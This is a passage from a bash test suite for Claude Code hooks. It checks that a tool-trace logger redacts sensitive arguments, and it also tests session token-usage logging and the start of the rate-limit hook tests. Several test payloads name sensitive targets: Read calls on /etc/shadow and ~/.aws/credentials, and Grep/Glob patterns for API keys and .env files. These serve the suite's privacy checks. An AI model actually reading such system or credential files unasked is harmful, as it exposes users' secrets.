  "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"TOKEN=abc123 curl https://api.example.com\"}}" \
  '.tool == "Bash" and .first_arg_or_skill == null' \
  'TOKEN|abc123'

# Behavior: Bash command beginning with safe lowercase command name records that token only.
# Steps: 1. Run Bash with git status --short; 2. Assert first_arg_or_skill is git.
tool_trace_case "tool-trace/bash_safe_command_kept" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git status --short\"}}" \
  '.tool == "Bash" and .first_arg_or_skill == "git"'

# Behavior: Bash command beginning with a pathful token redacts first_arg_or_skill.
# Steps: 1. Run Bash with an absolute command path; 2. Assert first_arg_or_skill is null and basename is absent.
tool_trace_case "tool-trace/bash_pathful_command_redacted" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"/usr/bin/secret-tool show account\"}}" \
  '.tool == "Bash" and .first_arg_or_skill == null' \
  'secret-tool'

# Behavior: Grep tool invocation never logs the pattern.
# Steps: 1. Run Grep with a secret-shaped pattern; 2. Assert first_arg_or_skill is null and pattern substrings are absent.
tool_trace_case "tool-trace/grep_pattern_redacted" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"API_KEY=sk-live-abc\"}}" \
  '.tool == "Grep" and .first_arg_or_skill == null' \
  'API_KEY|sk-live'

# Behavior: Glob tool invocation never logs the pattern.
# Steps: 1. Run Glob with an env-file pattern; 2. Assert first_arg_or_skill is null and pattern substrings are absent.
tool_trace_case "tool-trace/glob_pattern_redacted" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Glob\",\"tool_input\":{\"pattern\":\"**/.env*\"}}" \
  '.tool == "Glob" and .first_arg_or_skill == null' \
  '\.env'

# Behavior: Read tool with file_path inside cwd records repo-relative path.
# Steps: 1. Run Read with /tmp/proj/src/main.go under cwd /tmp/proj; 2. Assert first_arg_or_skill is src/main.go without cwd prefix.
tool_trace_case "tool-trace/read_repo_relative_path" \
  '{"cwd":"/tmp/proj","tool_name":"Read","tool_input":{"file_path":"/tmp/proj/src/main.go"}}' \
  '.tool == "Read" and .first_arg_or_skill == "src/main.go"'

# Behavior: Read tool with file_path under HOME but outside cwd records basename only.
# Steps: 1. Run Read with $HOME/.aws/credentials while cwd is outside HOME; 2. Assert only credentials is logged.
tool_trace_case "tool-trace/read_home_path_basename_only" \
  "$(jq -nc --arg home "$HOME" '{cwd:"/tmp/proj",tool_name:"Read",tool_input:{file_path:($home + "/.aws/credentials")}}')" \
  '.tool == "Read" and .first_arg_or_skill == "credentials"' \
  '\.aws|'"$HOME"

# Behavior: Read tool with file_path outside cwd and HOME records null.
# Steps: 1. Run Read with /etc/shadow; 2. Assert first_arg_or_skill is null and sensitive path substrings are absent.
tool_trace_case "tool-trace/read_foreign_path_redacted" \
  '{"cwd":"/tmp/proj","tool_name":"Read","tool_input":{"file_path":"/etc/shadow"}}' \
  '.tool == "Read" and .first_arg_or_skill == null' \
  'shadow|/etc'

# Behavior: Tool trace truncates long first_arg_or_skill values to the documented 80-character cap.
# Steps:
#   1. Prepare an Agent payload with a subagent_type longer than 80 characters.
#   2. Trigger the trace hook with the payload.
#   3. Verify the logged first_arg_or_skill is exactly 80 characters and emits no stdout or stderr.
tool_trace_first_arg_truncation() {
  local name="tool-trace/first_arg_truncation" trace_dir out err payload line value
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  payload="$(jq -nc --arg cwd "$REPO_ROOT" --arg subagent "$(printf 'a%.0s' $(seq 1 200))" '{cwd:$cwd,tool_name:"Agent",tool_input:{subagent_type:$subagent}}')"
  tool_trace_run "$payload" "$trace_dir" "$out" "$err"
  line="$(tool_trace_record "$trace_dir")"
  value="$(printf '%s\n' "$line" | jq -r '.first_arg_or_skill // ""' 2>/dev/null)"
  if [[ ${#value} -le 80 && ${#value} -eq 80 && ! -s "$out" && ! -s "$err" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — len=%s line=%q\n' "$name" "${#value}" "$line"
  fi
  rm -f "$out" "$err"
}
tool_trace_first_arg_truncation

# Behavior: Tool trace exits cleanly without writing when no project memory directory is discoverable.
# Steps:
#   1. Prepare an isolated Claude config directory with no matching project memory path.
#   2. Trigger the trace hook with a cwd outside any discoverable project.
#   3. Verify the hook exits zero, emits no output, and creates no files.
tool_trace_no_project_dir() {
  local name="tool-trace/no_project_dir" config_dir out err status before after
  should_run "$name" || return 0
  config_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace-config.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  before="$(find "$config_dir" -type f | wc -l)"
  printf '%s' '{"cwd":"/tmp/not-a-claude-project","tool_name":"Bash","tool_input":{"command":"ls"}}' \
    | CLAUDE_CONFIG_DIR="$config_dir" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$TRACE_HOOK" >"$out" 2>"$err"
  status=$?
  after="$(find "$config_dir" -type f | wc -l)"
  if [[ "$status" == "0" && "$before" == "$after" && ! -s "$out" && ! -s "$err" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s files-before=%s files-after=%s\n' "$name" "$status" "$before" "$after"
  fi
  rm -f "$out" "$err"
}
tool_trace_no_project_dir

# Behavior: Tool trace skips payloads that do not include a cwd field.
# Steps:
#   1. Prepare a valid Bash payload with no cwd.
#   2. Trigger the trace hook with the payload.
#   3. Verify the hook exits zero without creating tool-trace.jsonl or emitting output.
tool_trace_missing_cwd() {
  local name="tool-trace/missing_cwd" trace_dir out err status
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  tool_trace_run '{"tool_name":"Bash","tool_input":{"command":"ls"}}' "$trace_dir" "$out" "$err"
  status=$?
  if [[ "$status" == "0" && ! -f "$trace_dir/tool-trace.jsonl" && ! -s "$out" && ! -s "$err" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s\n' "$name" "$status"
  fi
  rm -f "$out" "$err"
}
tool_trace_missing_cwd

# Behavior: Tool trace audits malformed JSON and does not append a trace row.
# Steps:
#   1. Prepare a malformed stdin payload.
#   2. Trigger the trace hook with the malformed payload.
#   3. Verify the hook exits zero, writes no trace file, and records a malformed audit entry.
tool_trace_malformed_json() {
  local name="tool-trace/malformed_json" trace_dir out err status
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  tool_trace_run 'not-json' "$trace_dir" "$out" "$err"
  status=$?
  if [[ "$status" == "0" && ! -f "$trace_dir/tool-trace.jsonl" && ! -s "$out" && ! -s "$err" && -f "$CLAUDE_HOOK_LOG_DIR/tool-trace.err" ]] &&
     grep -q -F "malformed" "$CLAUDE_HOOK_LOG_DIR/tool-trace.err"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s\n' "$name" "$status"
  fi
  rm -f "$out" "$err"
}
tool_trace_malformed_json

tool_trace_malformed_key_bearing_rejected() {
  # Behavior: Malformed JSON containing key-looking substrings is rejected without appending.
  # Steps: 1. Run a broken payload containing cwd and tool_name keys; 2. Assert no JSONL line is written and audit records malformed JSON.
  local name="tool-trace/malformed_key_bearing_rejected" trace_dir out err status before after
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  before="$(grep -c -F "malformed" "$CLAUDE_HOOK_LOG_DIR/tool-trace.err" 2>/dev/null || true)"
  # Strict jq validation deferred to CC-027c (jq inline cost ~25ms/call
  # exceeds budget); brace heuristic rejects this payload because it lacks
  # a closing `}`. Other brace-shaped malformed inputs may slip through —
  # see CC-027c.
  tool_trace_run '{"cwd":"/tmp/proj","tool_name":"Bash","tool_input":{"command":' "$trace_dir" "$out" "$err"
  status=$?
  after="$(grep -c -F "malformed" "$CLAUDE_HOOK_LOG_DIR/tool-trace.err" 2>/dev/null || true)"
  if [[ "$status" == "0" && ! -s "$out" && ! -s "$err" && ! -s "$trace_dir/tool-trace.jsonl" && "$after" -gt "$before" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s before=%s after=%s trace=%q\n' "$name" "$status" "$before" "$after" "$(cat "$trace_dir/tool-trace.jsonl" 2>/dev/null)"
  fi
  rm -f "$out" "$err"
}
tool_trace_malformed_key_bearing_rejected

# Behavior: Tool trace append failures audit the error without blocking the tool call.
# Steps:
#   1. Prepare a trace file that cannot be appended.
#   2. Trigger the trace hook with a valid Bash payload.
#   3. Verify the hook exits zero, emits no output, and records an append audit entry.
tool_trace_append_failure_non_blocking() {
  local name="tool-trace/append_failure_non_blocking" trace_dir out err status target
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  target="$trace_dir/tool-trace.jsonl"
  : > "$target"
  chmod 0444 "$target"
  out="$(mktemp)"
  err="$(mktemp)"
  tool_trace_run "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls\"}}" "$trace_dir" "$out" "$err"
  status=$?
  chmod 0644 "$target"
  if [[ "$status" == "0" && ! -s "$out" && ! -s "$err" && -f "$CLAUDE_HOOK_LOG_DIR/tool-trace.err" ]] &&
     grep -q -F "append" "$CLAUDE_HOOK_LOG_DIR/tool-trace.err"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s\n' "$name" "$status"
  fi
  rm -f "$out" "$err"
}
tool_trace_append_failure_non_blocking

# Behavior: Tool trace disable env var prevents trace writes while preserving a zero exit.
# Steps:
#   1. Prepare a valid Bash payload and set CLAUDE_TOOL_TRACE_DISABLE.
#   2. Trigger the trace hook with tracing disabled.
#   3. Verify no trace file is created and no output is emitted.
tool_trace_disabled_envvar() {
  local name="tool-trace/disabled_envvar" trace_dir out err status
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  printf '%s' "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls\"}}" \
    | CLAUDE_TOOL_TRACE_DISABLE=1 CLAUDE_TOOL_TRACE_DIR="$trace_dir" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$TRACE_HOOK" >"$out" 2>"$err"
  status=$?
  if [[ "$status" == "0" && ! -f "$trace_dir/tool-trace.jsonl" && ! -s "$out" && ! -s "$err" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s\n' "$name" "$status"
  fi
  rm -f "$out" "$err"
}
tool_trace_disabled_envvar

# Behavior: Tool trace records metadata without leaking full command payload content.
# Steps:
#   1. Prepare a Bash payload containing a secret-shaped command string.
#   2. Trigger the trace hook with the payload.
#   3. Verify the trace row exists but omits the secret command content.
tool_trace_no_payload_leakage() {
  local name="tool-trace/no_payload_leakage" trace_dir out err line
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  tool_trace_run "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"printf SECRET_PAYLOAD\"}}" "$trace_dir" "$out" "$err"
  line="$(tool_trace_record "$trace_dir")"
  if [[ -n "$line" && "$line" != *"SECRET_PAYLOAD"* && ! -s "$out" && ! -s "$err" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — line=%q\n' "$name" "$line"
  fi
  rm -f "$out" "$err"
}
tool_trace_no_payload_leakage

# Behavior: When tool-trace.jsonl exceeds 4 MiB before append, the hook rotates it to .1 and starts fresh.
# Steps: 1. Pre-create an over-cap trace file; 2. Run a valid payload; 3. Assert .1 contains the old file and main contains one new line.
tool_trace_rotation_at_size_cap() {
  local name="tool-trace/rotation_at_size_cap" trace_dir out err target status main_size archive_size main_lines archive_lines
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  target="$trace_dir/tool-trace.jsonl"
  out="$(mktemp)"
  err="$(mktemp)"
  head -c 4500000 /dev/zero > "$target"
  tool_trace_run "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git status\"}}" "$trace_dir" "$out" "$err"
  status=$?
  main_size="$(stat -c %s "$target" 2>/dev/null || echo 0)"
  archive_size="$(stat -c %s "${target}.1" 2>/dev/null || echo 0)"
  main_lines="$(wc -l < "$target" 2>/dev/null || echo 0)"
  archive_lines="$(wc -l < "${target}.1" 2>/dev/null || echo 0)"
  if [[ "$status" == "0" && ! -s "$out" && ! -s "$err" && -f "${target}.1" && "$archive_size" -gt 4194304 && "$main_size" -lt 4194304 && "$main_lines" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s main-size=%s archive-size=%s main-lines=%s archive-lines=%s\n' "$name" "$status" "$main_size" "$archive_size" "$main_lines" "$archive_lines"
  fi
  rm -f "$out" "$err"
}
tool_trace_rotation_at_size_cap

# Behavior: When tool-trace.jsonl is under 4 MiB, no rotation occurs.
# Steps: 1. Pre-create an under-cap trace file with one line; 2. Run a valid payload; 3. Assert main has two lines and .1 is absent.
tool_trace_rotation_under_cap_no_op() {
  local name="tool-trace/rotation_under_cap_no_op" trace_dir out err target status lines
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  target="$trace_dir/tool-trace.jsonl"
  out="$(mktemp)"
  err="$(mktemp)"
  printf '%s\n' '{"old":true}' > "$target"
  tool_trace_run "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git status\"}}" "$trace_dir" "$out" "$err"
  status=$?
  lines="$(wc -l < "$target" 2>/dev/null || echo 0)"
  if [[ "$status" == "0" && ! -s "$out" && ! -s "$err" && "$lines" == "2" && ! -e "${target}.1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s archive-exists=%s\n' "$name" "$status" "$lines" "$([[ -e "${target}.1" ]] && echo yes || echo no)"
  fi
  rm -f "$out" "$err"
}
tool_trace_rotation_under_cap_no_op

# Behavior: JSONL records keep the four-field schema shape and primitive field types.
# Steps: 1. Run a Task payload; 2. Assert the emitted JSONL keys and value types match the schema.
tool_trace_case "tool-trace/jsonl_schema_shape" \
  "{\"cwd\":\"$REPO_ROOT\",\"session_id\":\"schema\",\"tool_name\":\"Task\",\"tool_input\":{\"subagent_type\":\"worker\"}}" \
  'keys == ["first_arg_or_skill","session_id","tool","ts"] and (.ts | type == "string") and (.session_id | type == "string") and (.tool | type == "string")'

# Behavior: install-hooks wires tool trace once and subsequent dry-runs report no pending change.
# Steps:
#   1. Prepare an isolated HOME with empty Claude settings.
#   2. Trigger install-hooks once and then run dry-run checks.
#   3. Verify tool-trace is wired once and later dry-runs report already wired.
tool_trace_install_hooks_idempotent() {
  local name="tool-trace/install_hooks_idempotent" home out1 out2 out3 count
  should_run "$name" || return 0
  home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/install-hooks.XXXXXX")"
  mkdir -p "$home/.claude"
  printf '%s\n' '{"hooks":{}}' > "$home/.claude/settings.json"
  out1="$(mktemp)"
  out2="$(mktemp)"
  out3="$(mktemp)"
  HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" --dry-run >"$out1" 2>&1
  HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" >/dev/null 2>&1
  HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" --dry-run >"$out2" 2>&1
  HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" --dry-run >"$out3" 2>&1
  count="$(jq '[.hooks.PreToolUse[]? | select(.matcher == "*") | (.hooks // [])[]? | select((.command | split("/") | last) == "hook-tool-trace.sh")] | length' "$home/.claude/settings.json")"
  if grep -q -F "would apply" "$out1" &&
     grep -q -F "already wired" "$out2" &&
     grep -q -F "already wired" "$out3" &&
     [[ "$count" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — first=%q second=%q third=%q count=%s\n' "$name" "$(cat "$out1")" "$(cat "$out2")" "$(cat "$out3")" "$count"
  fi
  rm -f "$out1" "$out2" "$out3"
}
tool_trace_install_hooks_idempotent

# Behavior: hook-tool-trace.sh stays under the documented hot-path budget so it can be safely wired with matcher "*".
# Steps: 1. Fire 100 valid Bash payloads through the hook; 2. Measure wall time; 3. Assert total < 3500ms (≈ 35ms/call cap — generous for slow CI runners; local observed 9–10ms/call).
tool_trace_performance_budget() {
  local name="tool-trace/performance_budget" trace_dir payload start_ms end_ms elapsed_ms
  should_run "$name" || return 0
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  payload='{"session_id":"perf","cwd":"'"$REPO_ROOT"'","tool_name":"Bash","tool_input":{"command":"git status"}}'
  start_ms=$(( $(date +%s%N) / 1000000 ))
  local i
  for ((i=0; i<100; i++)); do
    printf '%s' "$payload" | CLAUDE_TOOL_TRACE_DIR="$trace_dir" "$SCRIPT_DIR/hook-tool-trace.sh"
  done
  end_ms=$(( $(date +%s%N) / 1000000 ))
  elapsed_ms=$((end_ms - start_ms))
  local lines
  lines="$(wc -l < "$trace_dir/tool-trace.jsonl" 2>/dev/null || echo 0)"
  if [[ "$lines" == "100" && "$elapsed_ms" -lt "3500" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s — %d ms / 100 calls (%d ms/call avg)\n' "$name" "$elapsed_ms" "$((elapsed_ms / 100))"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — elapsed_ms=%d lines=%s (budget 3500ms / 100 calls)\n' "$name" "$elapsed_ms" "$lines"
  fi
  rm -rf "$trace_dir"
}
tool_trace_performance_budget

# =============================================================================
# hook-log-claude-usage
# =============================================================================

echo
$LIST || echo "== hook-log-claude-usage =="
truncate_log

stop_happy_path() {
  local name="stop_happy_path" home transcript payload out err status logfile
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript.jsonl"
  printf '%s\n' \
    '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' \
    '{"role":"user","usage":{"input_tokens":500,"output_tokens":0}}' \
    > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "sess1" '{transcript_path:$path,session_id:$session}')"
  out="$(mktemp)"
  err="$(mktemp)"
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >"$out" 2>"$err"
  status=$?
  logfile="$home/.claude/usage-tracker.jsonl"
  if [[ "$status" == "0" && -f "$logfile" ]] &&
     grep -q -F '"type":"session_total"' "$logfile" &&
     grep -q -F '"tokens":1700' "$logfile"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, logfile=%s)\n' "$name" "$status" "$logfile"
  fi
  rm -f "$out" "$err"
}

stop_missing_transcript_path() {
  local name="stop_missing_transcript_path" home status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  printf '%s' '{"session_id":"s1"}' | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_transcript_file_not_found() {
  local name="stop_transcript_file_not_found" home status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  printf '%s' '{"transcript_path":"/nonexistent/path","session_id":"s1"}' | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_malformed_json_payload() {
  local name="stop_malformed_json_payload" home status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  printf '%s' 'not json' | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_zero_token_transcript() {
  local name="stop_zero_token_transcript" home transcript payload status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-zero.jsonl"
  printf '%s\n' '{"role":"assistant","content":"hello"}' '{"role":"user","content":"ok"}' > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "s1" '{transcript_path:$path,session_id:$session}')"
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_failure_logged() {
  local name="stop_failure_logged" home transcript payload status logfile
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-fail.jsonl"
  printf '%s\n' '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' > "$transcript"
  logfile="$home/.claude/usage-tracker.jsonl"
  : > "$logfile"
  chmod 444 "$logfile"
  payload="$(jq -nc --arg path "$transcript" --arg session "s1" '{transcript_path:$path,session_id:$session}')"
  truncate_log
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  chmod 644 "$logfile"
  if [[ "$status" == "0" && -f "$TEST_LOG_FILE" ]] && grep -q -F "failed" "$TEST_LOG_FILE"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, hooks.log missing failure)\n' "$name" "$status"
  fi
}

stop_idempotent_double_call() {
  local name="stop_idempotent_double_call" home transcript payload status logfile total
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-idem.jsonl"
  printf '%s\n' \
    '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' \
    '{"role":"user","usage":{"input_tokens":500,"output_tokens":0}}' \
    > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "sess-idem" \
    '{transcript_path:$path,session_id:$session}')"
  # First invocation
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  # Second invocation (same session + transcript)
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  logfile="$home/.claude/usage-tracker.jsonl"
  # Sum all session_total entries for this session - must equal 1700, not 3400
  total=$(jq -Rs '[split("\n")[] | select(length>0) | try fromjson catch null | select(. != null and .type=="session_total") | .tokens // 0] | add // 0' "$logfile" 2>/dev/null || echo 0)
  if [[ "$status" == "0" && "$total" == "1700" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, total=%s, expected 1700)\n' "$name" "$status" "$total"
  fi
}

stop_nested_message_usage() {
  local name="stop_nested_message_usage" home transcript payload status logfile
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-nested.jsonl"
  # Nested format: usage is under message.usage (Claude API transcript format)
  printf '%s\n' \
    '{"role":"assistant","message":{"usage":{"input_tokens":800,"output_tokens":200}}}' \
    '{"role":"user","message":{"usage":{"input_tokens":100,"output_tokens":0}}}' \
    > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "sess-nested" \
    '{transcript_path:$path,session_id:$session}')"
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  logfile="$home/.claude/usage-tracker.jsonl"
  if [[ "$status" == "0" && -f "$logfile" ]] &&
     grep -q -F '"type":"session_total"' "$logfile" &&
     grep -q -F '"tokens":1100' "$logfile"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, logfile=%s)\n' "$name" "$status" "$logfile"
  fi
}

stop_no_session_id_skips_log() {
  local name="stop_no_session_id_skips_log" home transcript payload status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-nosession.jsonl"
  printf '%s\n' \
    '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' \
    > "$transcript"
  # Payload has transcript_path but no session_id field
  payload="$(jq -nc --arg path "$transcript" '{transcript_path:$path}')"
  # Invoke twice — without session_id the hook must skip logging (cannot deduplicate)
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, tracker unexpectedly exists)\n' "$name" "$status"
  fi
}

stop_happy_path
stop_missing_transcript_path
stop_transcript_file_not_found
stop_malformed_json_payload
stop_zero_token_transcript
stop_failure_logged
stop_idempotent_double_call
stop_nested_message_usage
stop_no_session_id_skips_log

# =============================================================================
# hook-save-rate-limits
# =============================================================================

echo
$LIST || echo "== hook-save-rate-limits =="

run_rl_hook() {
  local json="$1" config_dir="$2"
  printf '%s' "$json" | CLAUDE_CONFIG_DIR="$config_dir" "$RL_HOOK" 2>/dev/null
}

_set_mtime_secs_ago() {
  local file="$1" secs="$2"
  if command -v perl >/dev/null 2>&1; then
    perl -e 'utime(time()-$ARGV[0], time()-$ARGV[0], $ARGV[1])' "$secs" "$file"
